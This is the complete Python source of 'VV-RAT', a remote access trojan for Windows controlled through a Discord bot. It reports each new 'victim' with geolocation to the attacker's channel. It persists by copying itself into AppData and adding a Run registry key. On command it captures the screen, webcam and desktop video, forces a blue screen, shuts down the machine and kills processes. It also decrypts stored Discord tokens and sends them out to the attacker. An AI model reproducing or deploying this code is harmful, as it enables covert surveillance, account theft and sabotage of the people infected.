#//CODED BY VROLSN
#                                                                             !!GHOST VERSION!!      
#                                                                            Version       3.5.0
import discord
from discord.ext import commands
from Cryptodome.Cipher import AES
import base64
import winreg
import ctypes
import pygame
import sys
import cv2
import os
import random
import time
import tempfile
import subprocess
from comtypes import CLSCTX_ALL
from ctypes import *
import pyautogui as auto_gui
import shutil
import time
from discord import app_commands
from win32crypt import CryptUnprotectData
import threading
import requests
auto_gui.FAILSAFE = False

import ctypes
import time


import os
import sys

def get_scary_sound_path(sound_name):
    if getattr(sys, 'frozen', False):
        current_dir = sys._MEIPASS
    else:
        current_dir = os.path.dirname(os.path.realpath(__file__))

    sound_path = os.path.join(current_dir, 'Source', f'{sound_name}.wav')
    return sound_path

def play_sound(sound_path):
    pygame.mixer.init()
    pygame.mixer.music.load(sound_path)
    pygame.mixer.music.play()
    pygame.time.wait(int(pygame.mixer.Sound(sound_path).get_length() * 1000))

tokens_sent = []
global appdata
appdata = os.getenv('APPDATA')

intent = discord.Intents.default()
intent.members = True
intent.message_content = True

client=discord.Client(intents=intent)
bot_pre = commands.Bot(command_prefix="!", intents=intent)


@client.event
async def on_ready():
    global val2
    import winreg as reg
    import sys
    import platform
    import re
    import urllib
    import os
    import shutil
    import json
    import ctypes
    with urllib.request.urlopen("https://geolocation-db.com/json") as url:
        data = json.loads(url.read().decode())
        flag = data['country_code']
        city = data['city']
        state = data['state']
        ip = data['IPv4']
    import os
    on_ready.total = []
    global number
    number = 0
    global channel_name
    channel_name = None
    for x in client.get_all_channels():
        (on_ready.total).append(x.name)
    for y in range(len(on_ready.total)):
        if "session" in on_ready.total[y]:
            import re
            result = [e for e in re.split("[^0-9]", on_ready.total[y]) if e != '']
            biggest = max(map(int, result))
            number = biggest + 1
        else:
            pass  


    if number == 0:
        pcnamen = os.environ["COMPUTERNAME"]
        channel_name = f"VV--{pcnamen}"
        newchannel = await client.guilds[0].create_text_channel(channel_name)
    else:
        pcnamen = os.environ["COMPUTERNAME"]
        channel_name = f"VV--{pcnamen}"
        newchannel = await client.guilds[0].create_text_channel(channel_name)

    send_information = f"@here :white_check_mark: New Victim {channel_name} | {platform.system()} {platform.release()} | {ip} :flag_{flag.lower()}: | User : {os.getlogin()}"
    embed = discord.Embed(title=":crossed_swords: - VV-RAT VICTIM INFORMATIONS - :crossed_swords:", description=":gear: - BY **VV-RAT** - :gear:", color=discord.Colour.dark_purple())
    embed.add_field(name=":dvd: - ISO Information - :dvd:", value=f"{platform.system()}", inline=False)
    embed.add_field(name=":satellite: - IP ADRESS - :satellite:", value=f"{ip}", inline=False)
    embed.add_field(name=":flag_white: - VICTIM Country Flag - :flag_white:", value=f":flag_{flag.lower()}:", inline=True)
    embed.add_field(name=":city_dusk: - VICTIM City - :city_dusk:", value=f"```{city}```", inline=False)
    embed.add_field(name=":statue_of_liberty: - VICTIM State - :statue_of_liberty:", value=f"```{state}```", inline=False)
    embed.add_field(name=":busts_in_silhouette: - User Name - :busts_in_silhouette:", value=f"```{os.getlogin()}```", inline=False)
    embed.add_field(name="BASE COMS", value=f"$help , $troll, $stat", inline=False)
    embed.add_field(name=":dvd: VERSION :dvd:", value="```diff\n+3.5.0```\n [FULL]\n")
    embed.set_image(url="https://cdn.discordapp.com/attachments/979113389349539883/1218837752938893393/vvlogo.png?ex=66091e1d&is=65f6a91d&hm=c26d4c39e022d5f491e379844ff910502df049bc9e34f0c36c0f9d5358c3eb4f&")
    embed.set_footer(text=f"CODED BY VROLSN")
    await newchannel.send("@here ")
    await newchannel.send(embed=embed)
    game = discord.Game(f"VICTIM")
    await client.change_presence(status=discord.Status.online, activity=game)
    import ctypes
    import psutil



    def get_application_path():
        return os.path.abspath(sys.argv[0])

    def get_application_name():
        return os.path.splitext(os.path.basename(sys.argv[0]))[0]

    def move_to_temp_and_add_to_startup():
        global val1
        appdata_path = os.getenv("APPDATA")
        roaming_path = os.path.join(appdata_path, "Roaming")
        temp_folder = os.path.join(roaming_path, "EPicGames")

        app_path = get_application_path()
        temp_app_path = os.path.join(temp_folder, os.path.basename(app_path))

        if not os.path.exists(temp_folder):
            os.makedirs(temp_folder)

        shutil.copy2(app_path, temp_app_path)
        key = r"Software\Microsoft\Windows\CurrentVersion\Run"
        app_name = get_application_name()

        try:
            reg_key = reg.OpenKey(reg.HKEY_CURRENT_USER, key, 0, reg.KEY_SET_VALUE)
            reg.SetValueEx(reg_key, app_name, 0, reg.REG_SZ, temp_app_path)
            reg.CloseKey(reg_key)
            print(f"{app_name} added to startup successfully.")
            val1 = True
        except Exception as e:
            print(f"Error adding {app_name} to startup: {e}")
            val1 = False



    move_to_temp_and_add_to_startup()

    try:
        current_dir = os.path.dirname(os.path.realpath(__file__))
        os.remove(os.path.join(current_dir, sys.argv[0]))
        val2 = True
    except Exception:
        val2 = False  

def download_image(url, save_path):
    response = requests.get(url)
    if response.status_code == 200:
        with open(save_path, 'wb') as f:
            f.write(response.content)
        return True
    else:
        print(f"Error downloading image. Status code: {response.status_code}")
        return False

def set_wallpaper(image_path):
    SPI_SETDESKWALLPAPER = 20
    windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, image_path, 3)

async def main(message):

    image_url = message.content[17:]
    temp_folder = os.path.join(os.getenv("TEMP"), "WallpaperTemp")
    if not os.path.exists(temp_folder):
        os.makedirs(temp_folder)
    image_save_path = os.path.join(temp_folder, "84218947819824987598721893.jpg")
    if download_image(image_url, image_save_path):
        print("Image downloaded successfully.")
        set_wallpaper(image_save_path)
        print("Wallpaper set successfully.")
        await message.channel.send("succes")
    else:
        print("Failed to download the image.")
        await message.channel.send("failed")
        os.remove(image_save_path)


async def send_tokens_to_channel(tokens, channel):
    global tokens_sent

    for token in tokens:
        if token in tokens_sent:
            continue
        await channel.send(f"```{token}```")
        tokens_sent.append(token)


from pytube import YouTube
from moviepy.editor import VideoFileClip
import os



async def capture_and_send_video(message, duration=10):
    temp_dir = os.path.join(os.getcwd(), 'temp')

    if not os.path.exists(temp_dir):
        os.makedirs(temp_dir)

    output_file = os.path.join(temp_dir, '879876468763876278632.avi')

    try:
        cap = cv2.VideoCapture(0)
    except:
        await message.channel.send("[X] **Cam is not found.**")
    frame_width = int(cap.get(3))
    frame_height = int(cap.get(4))
    fps = 15

    fourcc = cv2.VideoWriter_fourcc(*'MJPG')
    out = cv2.VideoWriter(output_file, fourcc, fps, (frame_width, frame_height))

    start_time = time.time()
    await message.channel.send("[*] **Record started.**")

    while int(time.time() - start_time) < duration:
        ret, frame = cap.read()
        if not ret:
            break
        out.write(frame)
        if cv2.waitKey(1) & 0xFF == ord('q'):
            break

    cap.release()
    out.release()

    cv2.destroyAllWindows()
    
    await message.channel.send("[*] **Video is queue please wait.**")
    await message.channel.send(file=discord.File(output_file))
    os.remove(output_file)

async def capturedesk(message):
    print("st1")
    import cv2
    import pygetwindow as gw
    import pyautogui
    import os
    import numpy as np
    import discord
    DEFAULT_WIDTH = 1920
    DEFAULT_HEIGHT = 1080
    fourcc = cv2.VideoWriter_fourcc(*'XVID')
    temp_folder = 'temp'
    if not os.path.exists(temp_folder):
        os.makedirs(temp_folder)

    output_file = os.path.join(temp_folder, '67362178638712638712.avi')
    await message.channel.send("[*] **Started video. wait.**")
    screen = gw.getWindowsWithTitle('Your Window Title')[0] if gw.getWindowsWithTitle('Your Window Title') else None
    if screen:
        screen_width, screen_height = screen.width, screen.height
    else:
        screen_width, screen_height = DEFAULT_WIDTH, DEFAULT_HEIGHT

    out = cv2.VideoWriter(output_file, fourcc, 15.0, (screen_width, screen_height))
    start_time = cv2.getTickCount()

    try:
        while True:
            screenshot = pyautogui.screenshot()
            frame = cv2.cvtColor(np.array(screenshot), cv2.COLOR_RGB2BGR)
            out.write(frame)
            if cv2.waitKey(1) == 27:
                break
            elapsed_time = (cv2.getTickCount() - start_time) / cv2.getTickFrequency()
            if elapsed_time > 40:
                break
    finally:
        out.release()
        cv2.destroyAllWindows()
        await message.channel.send("[*] **Sending video.**")
        await message.channel.send(file=discord.File(output_file))
        os.remove(output_file)


@client.event
async def on_message(message):
    import os
    comname = os.environ["COMPUTERNAME"]
    maincom = f"vv-{comname}"
    if message.content == ".$screen":
        print(message.channel)

        if maincom.lower() != message.channel.name:
            return
        
        import os
        from mss import mss
        with mss() as sct:
            sct.shot(output=os.path.join(os.getenv('TEMP') + "\\monitor.png"))
        file = discord.File(os.path.join(os.getenv('TEMP') + "\\monitor.png"), filename="monitor.png")
        await message.channel.send(f"[*] **Succes!**", file=file)
        os.remove(os.path.join(os.getenv('TEMP') + "\\monitor.png"))

    if message.content.startswith(".$msgbox"):
        if maincom.lower() != message.channel.name:
            return
        import ctypes
        import time
        MB_YESNO = 0x04
        MB_HELP = 0x4000
        ICON_STOP = 0x10
        def mess():
            ctypes.windll.user32.MessageBoxW(0, message.content[11:], "Error", MB_YESNO | ICON_STOP)
        import threading
        messa = threading.Thread(target=mess)
        messa._running = True
        messa.daemon = True
        messa.start()
        import win32con
        import win32gui
        def get_all_hwnd(hwnd,mouse):
            def winEnumHandler(hwnd, ctx):
                if win32gui.GetWindowText(hwnd) == "Error":
                    win32gui.ShowWindow(hwnd, win32con.SW_RESTORE)
                    win32gui.SetWindowPos(hwnd,win32con.HWND_NOTOPMOST, 0, 0, 0, 0, win32con.SWP_NOMOVE + win32con.SWP_NOSIZE)
                    win32gui.SetWindowPos(hwnd,win32con.HWND_TOPMOST, 0, 0, 0, 0, win32con.SWP_NOMOVE + win32con.SWP_NOSIZE)  
                    win32gui.SetWindowPos(hwnd,win32con.HWND_NOTOPMOST, 0, 0, 0, 0, win32con.SWP_SHOWWINDOW + win32con.SWP_NOMOVE + win32con.SWP_NOSIZE)
                    return None
                else:
                    pass
            if win32gui.IsWindow(hwnd) and win32gui.IsWindowEnabled(hwnd) and win32gui.IsWindowVisible(hwnd):
                win32gui.EnumWindows(winEnumHandler,None)
        win32gui.EnumWindows(get_all_hwnd, 0)

    if message.content == ".$mouse":
        if maincom.lower() != message.channel.name:
            return
        import random
        random_size = random.randint(720, 1440)
        random_sizetwo = random.randint(720, 1480)
        random_sizethr = random.randint(720, 1480)
        random_sizefou = random.randint(720, 1480)  
        i=0
        while True:
            auto_gui.moveTo(random_size, 531)
            auto_gui.moveTo(random_sizetwo, 531)
            auto_gui.moveTo(random_sizethr, 531)
            auto_gui.moveTo(random_sizefou, 531)
            i = i+1

            if i == 100:
                break
        await message.channel.send("[*] **Command is Ended Succesful.**")

    if message.content == ".$bluescreen":
        if maincom.lower() != message.channel.name:
            return
        import ctypes
        import ctypes.wintypes
        ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
        ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, ctypes.byref(ctypes.wintypes.DWORD()))
        await message.channel.send("[*] **Succes!**")




    if message.content == ".$shutdown":
        if maincom.lower() != message.channel.name:
            return
        import os
        os.system("shutdown /p")
        await message.channel.send("[*] **Succes!**")
            
    if message.content == ".$res":
        if maincom.lower() != message.channel.name:
            return
        import os
        os.system("shutdown /r /t 00")
        await message.channel.send("[*] **Succes!**")


    if message.content.startswith(".$documention"):
        if maincom.lower() != message.channel.name:
            return
        import os
        import random

        doc_name = random.randint(99999, 9999999)

        cd_userprofile = os.path.join(os.path.join(os.path.expanduser('~')), 'Desktop')
        os.system(f"echo {message.content[17:]} > {cd_userprofile}\{doc_name}.txt")
        os.system(f"start {cd_userprofile}\{doc_name}.txt")

        embed = discord.Embed(title=":crossed_swords: VV RAT :crossed_swords:", description="Create Documention", color=discord.Colour.green())
        embed.add_field(name=":tickets: DOCUMENTION NAME :tickets:", value=f"```diff\n- {doc_name}.txt\n```", inline=False)
        embed.add_field(name=":bookmark_tabs: DOCUMENTION DESCRIPTION :bookmark_tabs:", value=f"```diff\n- {message.content[17:]}\n```", inline=False)
        embed.add_field(name=":cd: CREATED DOCUMENTİON CD :cd:", value=f"```diff\n- {cd_userprofile}\n```", inline=False)
        embed.set_thumbnail(url="https://i.hizliresim.com/9ai4mgd.png")
        await message.channel.send(embed=embed)

    
    
    if message.content == ".$cam":
        if maincom.lower() != message.channel.name:
            return
        import os
        cap = cv2.VideoCapture(0)
        ret, frame = cap.read()

        if ret:
            temp_dir = tempfile.gettempdir()
            temp_path = os.path.join(temp_dir, '328401982984829984.jpg')
            cv2.imwrite(temp_path, frame)

            print(f'Anlık görüntü başarıyla {temp_path} dizinine kaydedildi.')

            await message.channel.send(file=discord.File(temp_path))
            os.remove(temp_path)
            print("removed")
        else:
            print('Görüntü alınamadı.')
            await message.channel.send("camere not founded")

        cap.release()

    
    if message.content == ".$camvid":
        if maincom.lower() != message.channel.name:
            return
        await capture_and_send_video(message, duration=15)

    if message.content == ".$deskvid":
        if maincom.lower() != message.channel.name:
            return
        await capturedesk(message)


    if message.content == ".$tok":
        if maincom.lower() != message.channel.name:
            return
        global tokens_sent
        import os
        import base64
        import re
        import json
        from Cryptodome.Cipher import AES
        import requests

        def decrypt_val(buff, master_key):
            try:
                iv = buff[3:15]
                payload = buff[15:]
                cipher = AES.new(master_key, AES.MODE_GCM, iv)
                decrypted_pass = cipher.decrypt(payload)
                decrypted_pass = decrypted_pass[:-16].decode()
                return decrypted_pass
            except Exception:
                return "Failed to decrypt password"

        def get_master_key(path):
            with open(path, "r", encoding="utf-8") as f:
                c = f.read()
            local_state = json.loads(c)
            master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            master_key = master_key[5:]
            master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
            return master_key

        def grab_tokens():
            baseurl = "https://discord.com/api/v9/users/@me"
            appdata = os.getenv("localappdata")
            roaming = os.getenv("appdata")
            regex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
            encrypted_regex = r"dQw4w9WgXcQ:[^\"]*"
            tokens_sent = []
            tokens = []
            ids = []

            paths = {
                'Discord': roaming + '\\discord\\Local Storage\\leveldb\\',
                'Discord Canary': roaming + '\\discordcanary\\Local Storage\\leveldb\\',
            }

            for name, path in paths.items():
                if not os.path.exists(path):
                    continue
                disc = name.replace(" ", "").lower()
                if "cord" in path:
                    if os.path.exists(roaming + f'\\{disc}\\Local State'):
                        for file_name in os.listdir(path):
                            if file_name[-3:] not in ["log", "ldb"]:
                                continue
                            for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                                for y in re.findall(encrypted_regex, line):
                                    token = decrypt_val(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), get_master_key(roaming + f'\\{disc}\\Local State'))
                                    r = requests.get(baseurl, headers={
                                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
                                        'Content-Type': 'application/json',
                                        'Authorization': token})
                                    if r.status_code == 200:
                                        uid = r.json()['id']
                                        if uid not in ids:
                                            tokens.append(token)
                                            ids.append(uid)
                else:
                    for file_name in os.listdir(path):
                        if file_name[-3:] not in ["log", "ldb"]:
                            continue
                        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                            for token in re.findall(regex, line):
                                r = requests.get(baseurl, headers={
                                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
                                    'Content-Type': 'application/json',
                                    'Authorization': token})
                                if r.status_code == 200:
                                    uid = r.json()['id']
                                    if uid not in ids:
                                        tokens.append(token)
                                        ids.append(uid)

            if os.path.exists(roaming + "\\Mozilla\\Firefox\\Profiles"):
                for path, _, files in os.walk(roaming + "\\Mozilla\\Firefox\\Profiles"):
                    for _file in files:
                        if not _file.endswith('.sqlite'):
                            continue
                        for line in [x.strip() for x in open(f'{path}\\{_file}', errors='ignore').readlines() if x.strip()]:
                            for token in re.findall(regex, line):
                                r = requests.get(baseurl, headers={
                                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
                                    'Content-Type': 'application/json',
                                    'Authorization': token})
                                if r.status_code == 200:
                                    uid = r.json()['id']
                                    if uid not in ids:
                                        tokens.append(token)
                                        ids.append(uid)

            return tokens


        captured_tokens = grab_tokens()
        await send_tokens_to_channel(captured_tokens, message.channel)

    
    if message.content.startswith(".$desktophoto"):
        if maincom.lower() != message.channel.name:
            return
        wurl = message.content[17:]
        await main(message)



    if message.content == ".$exit":
        if maincom.lower() != message.channel.name:
            return
        import time
        await message.channel.send("Exiting VV-RAT...")
        time.sleep(1)
        await message.channel.send("Thanks For Use VV-RAT.")
        exit()

    
    if message.content == "$help":
        await message.channel.send("``` .$screen \n .$msgbox\n .$tok\n .$bluescreen\n .$res\n .$shutdown\n .$exit\n .$camvid\n .$cam\n .$desktophoto\n .$killdc\n .$mouse```")

    if message.content == "$troll":
        await message.channel.send("``` .$troll scary1,scary2,not1,gg \n .$nof```")


    if message.content.startswith(".$troll"):
        if maincom.lower() != message.channel.name:
            return
        try:
            selected_sound = message.content[11:]
            sound_path = get_scary_sound_path(selected_sound)
            play_sound(sound_path)
        except Exception as e:
            await message.channel.send("```AKTİF SES DOSYALARI:\n scary1\n scary2\n not1\n gg```")


    if message.content == ".$trollscreen":
        import win32gui
        pass



    if message.content.startswith(".$nof"):
        if maincom.lower() != message.channel.name:
            return
        # 9
        from notifypy import Notify
        import os
        import sys

        notification = Notify()
        notification.title = "NONAMED"
        notification.message = message.content[9:]

        if getattr(sys, 'frozen', False):

            current_dir = sys._MEIPASS
        else:

            current_dir = os.path.dirname(os.path.realpath(__file__))

        notification.audio = os.path.join(current_dir, 'Source', 'not1.wav')
        notification.send(block=False)
        await message.channel.send("success")



    if message.content == ".$killdc":
        if maincom.lower() != message.channel.name:
            return
        import time
        import pyautogui
        import subprocess
        import psutil

        async def close_discord():
            for process in psutil.process_iter(['pid', 'name']):
                if 'Discord' in process.info['name']:
                    try:
                        subprocess.run(['taskkill', '/F', '/PID', str(process.info['pid'])], check=True)
                        print('Discord kapatıldı.')
                        await message.channel.send("succes")
                    except subprocess.CalledProcessError as e:
                        print(f'Hata: {e}')

        await close_discord()

    if message.content.startswith(".$killtask"):
        if maincom.lower() != message.channel.name:
            return

        import time
        import pyautogui
        import subprocess
        import psutil


        async def taskill():
            for process in psutil.process_iter(['pid', 'name']):
                if f'{message.content[14:]}' in process.info['name']:

                    subprocess.run(['taskkill', '/F', '/PID', str(process.info['pid'])], check=True)
                    print('Discord kapatıldı.')
                    await message.channel.send("succes")




        await taskill() 


client.run("TOKEN HERE")
